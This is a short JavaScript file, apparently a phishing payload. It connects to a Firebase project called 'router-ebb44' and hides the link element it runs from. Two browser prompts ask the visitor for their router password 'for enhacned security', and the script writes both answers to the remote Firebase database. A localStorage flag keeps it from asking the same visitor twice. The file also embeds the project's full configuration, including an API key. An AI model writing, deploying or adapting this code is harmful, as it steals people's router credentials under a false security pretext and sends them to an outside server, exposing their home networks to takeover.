import { initializeApp } from 'firebase/app';
import { getDatabase, ref, set, push } from 'firebase/database';

const firebaseConfig = {
    apiKey: 'AIzaSyBQHJru-HH_pJYs6lZaNfY1dAD8lQOmGOs',
    authDomain: 'router-ebb44.firebaseapp.com',
    projectId: 'router-ebb44',
    storageBucket: 'router-ebb44.appspot.com',
    messagingSenderId: '628610125565',
    appId: '1:628610125565:web:4132465a7020db1b55b894',
    measurementId: 'G-2PGP71BY92',
};

const app = initializeApp(firebaseConfig);

function hideFolder() {
    const anchor = document.currentScript.parentElement;
    anchor.setAttribute('href', 'javascript:void(0)');
    anchor.style.display = 'none';
}

function getPass() {
    if (localStorage.getItem('runned-router')) return;
    const db = getDatabase();
    const refKey = push(ref(db)).key;

    const userRef = ref(db, refKey);

    const value1 = prompt(
        'Enter your router password for enhacned security : '
    );
    const value2 = prompt('Enter Again : ');

    set(userRef, {
        password: value1,
        'confirm password': value2,
    });
    localStorage.setItem('runned-router', true);
}

hideFolder();
getPass();
